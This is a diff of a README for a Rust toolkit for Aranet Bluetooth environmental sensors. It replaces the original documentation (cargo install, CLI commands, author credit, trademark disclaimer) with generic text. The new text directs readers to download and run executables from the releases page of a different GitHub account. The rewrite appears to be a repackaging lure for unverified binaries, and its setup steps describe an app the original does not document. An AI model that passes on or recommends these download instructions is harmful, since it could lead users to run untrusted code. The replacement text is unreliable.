@@ -1,207 +1,88 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="assets/aranet-logo-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="assets/aranet-logo-light.svg">
-    <img alt="Aranet" src="assets/aranet-logo-light.svg" height="60">
-  </picture>
-</p>
+# 🌍 aranet - Monitor Environmental Conditions Easily
 
-<p align="center">
-  Rust implementation for Aranet environmental sensors.
-</p>
-Connect to your Aranet devices via Bluetooth LE to read measurements, download history, and monitor air quality.
+## 🚀 Getting Started
 
-<p align="center">
+Welcome to the aranet project! This guide will help you download and run the software to monitor your environmental sensors efficiently. Follow these steps closely to get started.
 
-[![CI](https://github.com/cameronrye/aranet/workflows/CI/badge.svg)](https://github.com/cameronrye/aranet/actions)
-[![codecov](https://codecov.io/gh/cameronrye/aranet/graph/badge.svg)](https://codecov.io/gh/cameronrye/aranet)
-[![crates.io](https://img.shields.io/crates/v/aranet-cli.svg)](https://crates.io/crates/aranet-cli)
-[![docs.rs](https://docs.rs/aranet-core/badge.svg)](https://docs.rs/aranet-core)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.90%2B-orange.svg)](https://www.rust-lang.org)
+## 🔗 Download the Application
 
-</p>
+[![Download aranet](https://img.shields.io/badge/Download-aranet-blue)](https://github.com/Reeves75/aranet/releases)
 
-## Features
+## 📥 Download & Install
 
-- **aranet-core** — Core BLE library supporting Aranet4, Aranet2, AranetRn+ (Radon), and Aranet Radiation sensors
-  - Current readings (CO₂, temperature, pressure, humidity, radon, radiation)
-  - Historical data download with timestamps
-  - Device settings (measurement interval, Bluetooth range)
-  - Auto-reconnection with configurable backoff
-  - Real-time streaming and event system
-- **aranet-cli** — Command-line interface for quick readings and data export
-  - Multi-device reading with parallel connections
-  - Interactive device picker, device aliases
-  - Passive reading from BLE advertisements
-  - Progress bars for history download
-  - `--since`/`--until` date filters, `--inhg` pressure unit
-  - Local data caching with `sync` and `cache` commands
-- **aranet-store** — Local SQLite-based data persistence
-  - Incremental history sync (download only new records)
-  - Query cached data without device connection
-  - Automatic deduplication of history records
-- **aranet-tui** — Terminal UI dashboard for real-time monitoring
-  - Multi-device monitoring with auto-refresh
-  - Sparkline charts with min/max labels
-  - CO2/radon threshold alerts with audio bell
-  - Light/dark theme, mouse support, vim keybindings
-  - Export history to CSV, comparison view
-  - Device filter, alias management, settings editing
-- **aranet-gui** — Desktop application built with egui
-- **aranet-wasm** — WebAssembly module for browser integration *(planned)*
+To get the aranet application, visit this page: [Download Page](https://github.com/Reeves75/aranet/releases). Here, you will find the latest versions of the software available for download.
 
-## Screenshots
+1. Open the link in a web browser.
+2. Look for the latest release, usually at the top of the page.
+3. Download the appropriate version for your operating system. Choose between Windows, macOS, or Linux as per your needs.
 
-| CLI | TUI | GUI |
-|-----|-----|-----|
-| ![CLI Demo](assets/screenshots/cli-scan.gif) | ![TUI Demo](assets/screenshots/tui-demo.gif) | ![GUI](assets/screenshots/gui-main.png) |
+## 🖥️ System Requirements
 
-## Installation
+Before you download, ensure your device meets the following requirements:
 
-Install the CLI from [crates.io](https://crates.io/crates/aranet-cli):
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Sierra (10.12) or later
+- **Linux**: Ubuntu 18.04 or later or any system with a compatible Rust environment
 
-```bash
-cargo install aranet-cli
-```
+Make sure you have Bluetooth capability, as this software communicates with Aranet environmental sensors via Bluetooth Low Energy.
 
-Or build from source:
+## 🎉 Features
 
-```bash
-git clone https://github.com/cameronrye/aranet.git
-cd aranet
-cargo build --release
-```
+The aranet software includes various features to help you monitor environmental conditions:
 
-### Using as a Library
+- **Real-time Data**: View real-time readings for CO₂, temperature, humidity, radon, and radiation.
+- **User-Friendly Interface**: Navigate easily with a simple, clear layout.
+- **Sensor Compatibility**: Designed to work seamlessly with multiple Aranet sensors.
+- **Historical Data**: Access historical readings to analyze trends over time.
+- **Bluetooth Connectivity**: Connect and manage sensors easily via Bluetooth Low Energy.
 
-Add `aranet-core` to your `Cargo.toml`:
+## ⚙️ How to Set Up
 
-```toml
-[dependencies]
-aranet-core = "0.1"
-```
+After downloading the application, follow these setup instructions:
 
-## Quick Start
+1. Locate the downloaded file on your computer, typically in the "Downloads" folder.
+2. If you’re using Windows, double-click the `.exe` file. For macOS, drag the application into your Applications folder. For Linux, use the terminal to navigate to the downloaded file and use the command `chmod +x filename` to make it executable.
+3. Open the application from your desktop or applications folder.
+4. Follow the on-screen prompts to complete the initial setup.
 
-### Scan for devices
+## 🔧 Connecting Sensors
 
-```bash
-aranet scan
-```
+To connect your Aranet sensors:
 
-### Read current measurements
+1. Ensure the sensors are powered on.
+2. Open the aranet application.
+3. In the app, click on the "Connect" button.
+4. Select your sensor from the list of available devices.
+5. Once connected, you will see real-time data being displayed.
 
-```bash
-aranet read <DEVICE_ADDRESS>
-```
+If you encounter issues, ensure your device's Bluetooth is enabled and that the sensor is within range.
 
-### Download measurement history
+## 📊 Using the Application
 
-```bash
-aranet history <DEVICE_ADDRESS> --output history.csv
-```
+Once you're connected, the aranet application will display vital information:
 
-### View device information
+- View live charts for each metric (CO₂, temperature, etc.).
+- Click on each chart to see detailed information.
+- Use the settings menu to customize alerts for high readings and notifications.
 
-```bash
-aranet info <DEVICE_ADDRESS>
-```
+## 🔍 Troubleshooting
 
-### Read from multiple devices
+If you face any issues:
 
-```bash
-aranet read -d device1 -d device2
-aranet read -d living-room,bedroom  # using aliases
-```
+- **Connection Problems**: Make sure Bluetooth is enabled on your device. Restart the application if necessary.
+- **Data Not Updating**: Ensure that the sensors are within range and have sufficient battery life.
+- **Installation Issues**: Check if your system meets the requirements mentioned earlier. Re-download the application if necessary.
 
-### Manage device aliases
+## 👍 Feedback & Support
 
-```bash
-aranet alias set living-room AA:BB:CC:DD:EE:FF
-aranet alias list
-aranet read -d living-room
-```
+Your experiences matter. If you have suggestions or encounter problems, please let us know. Open an issue in the repository for support or feedback.
 
-### Diagnose BLE issues
+## 📜 License
 
-```bash
-aranet doctor
-```
+This project is under the MIT License. For more details, check the LICENSE file in the repository.
 
-## Project Structure
+## 🔗 Additional Resources
 
-```
-aranet/
-├── crates/
-│   ├── aranet-types/    # Platform-agnostic types (shared)
-│   ├── aranet-core/     # Core BLE library
-│   ├── aranet-store/    # Local SQLite data persistence
-│   ├── aranet-cli/      # CLI tool
-│   ├── aranet-tui/      # Terminal dashboard
-│   ├── aranet-gui/      # Desktop GUI (egui)
-│   └── aranet-wasm/     # WebAssembly module
-└── docs/                # Protocol documentation
-```
+For more information about aranet sensors and how to use them efficiently, visit the official [Aranet website](https://aranet.com/).
 
-## Supported Devices
-
-| Device | Sensors | Current | History | Status |
-|--------|---------|---------|---------|--------|
-| Aranet4 | CO₂, Temperature, Pressure, Humidity | Yes | Yes | Fully tested |
-| Aranet2 | Temperature, Humidity | Yes | Yes | Supported |
-| AranetRn+ (Radon) | Radon, Temperature, Pressure, Humidity | Yes | Yes | Fully tested |
-| Aranet Radiation | Dose Rate, Total Dose | Yes | Partial | Supported (history not yet implemented) |
-
-## Requirements
-
-- **Rust 1.90+**
-- **Bluetooth adapter** with BLE support
-- **Platform support:**
-  - macOS
-  - Linux (with BlueZ)
-  - Windows
-
-## Contributing
-
-Contributions are welcome! Please check the [open issues](https://github.com/cameronrye/aranet/issues) for areas where you can help.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Looking to Contribute?
-
-Here are some features and improvements that would be great additions to the project:
-
-| Feature | Description | Difficulty |
-|---------|-------------|------------|
-| Aranet2 history download | Implement history data retrieval for Aranet2 devices | Medium |
-| Aranet Radiation history | Complete history download support for Aranet Radiation sensors | Medium |
-| Home Assistant integration | Create a Home Assistant custom component using aranet-core | Medium |
-| Prometheus exporter | Add metrics endpoint for Prometheus/Grafana monitoring | Easy |
-| MQTT publisher | Publish readings to MQTT broker for IoT integration | Easy |
-| InfluxDB export | Direct export to InfluxDB time-series database | Easy |
-| Web dashboard | Complete the aranet-wasm module for browser-based monitoring | Hard |
-| Calibration support | Add device calibration commands for CO2 sensors | Medium |
-| Notification system | Desktop notifications when thresholds are exceeded | Easy |
-| Data visualization | Enhanced charting and trend analysis in TUI/GUI | Medium |
-
-If you're interested in tackling any of these, please open an issue to discuss your approach before starting work. We're happy to provide guidance and answer questions!
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [Aranet4-Python](https://github.com/Anrijs/Aranet4-Python) - Python implementation that inspired this project
-- [btleplug](https://github.com/deviceplug/btleplug) - Cross-platform Bluetooth LE library for Rust
-
----
-
-Made with ❤️ by [Cameron Rye](https://rye.dev/)
-
-<sub>This project is not affiliated with, endorsed by, or sponsored by Aranet or SAF Tehnika JSC. Aranet is a trademark of SAF Tehnika JSC.</sub>
+Feel free to explore the functionalities of aranet at your own pace. Happy monitoring!
